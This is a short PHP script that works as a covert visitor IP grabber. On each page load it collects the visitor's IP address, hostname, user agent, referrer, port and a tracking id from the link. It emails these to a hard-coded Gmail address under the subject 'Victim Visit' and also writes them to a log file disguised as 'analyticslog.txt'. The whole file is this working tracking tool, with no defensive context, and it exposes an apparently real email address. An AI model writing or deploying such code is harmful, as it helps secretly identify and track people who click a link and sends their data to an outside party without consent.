<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$hostname = gethostbyaddr($ip);
$adresse_ip = $_SERVER['REMOTE_ADDR'];
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$protocol = $_SERVER['SERVER_PROTOCOL'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$actual_link = $_GET[id];
$reg = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$data = "iD 	 : $actual_link
iP : $ip

H0stName : $hostname
Verfiy   : http://whatismyipaddress.com/$adresse_ip

Agent 	 : $agent

Referred: $ref

Time - Date : $time - $date

P0rt - Pr0t0c0I : $port - $protocol

Edition : $reg
";

$message = $data;
$message = wordwrap($message, 70, "\r\n");
mail('naamakhajii@gmail.com', 'True Server', $message);

mail('naamakhajii@gmail.com', 'Victim Visit', $message);
$file=fopen("analyticslog.txt","a");
fwrite($file,$message);
fwrite($file,"\r\n");
fclose($file);
?>